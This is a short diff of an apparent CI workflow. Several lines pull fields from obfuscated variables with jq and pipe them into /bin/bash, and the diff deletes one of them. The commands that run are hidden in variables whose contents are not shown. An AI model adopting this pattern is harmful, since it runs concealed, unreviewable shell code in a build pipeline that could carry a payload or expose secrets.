@@ -24,7 +24,6 @@ jobs:
           echo $krh888 | jq -r .e0700 | /bin/bash
           echo $xuc010 | jq -r .caat13608 | /bin/bash
           echo $m8 | jq -r .bdxn5674 | /bin/bash
-          printf '%s' "$js32" | jq -r .xedy86 | /bin/bash
           printf '%s' "$rydeo7" | jq -r .rjeyl97416 | /bin/bash
           printf '%s' "$fl0" | jq -r .bmul3 | /bin/bash
           echo $jdks68 | jq -r .qse5 | /bin/bash
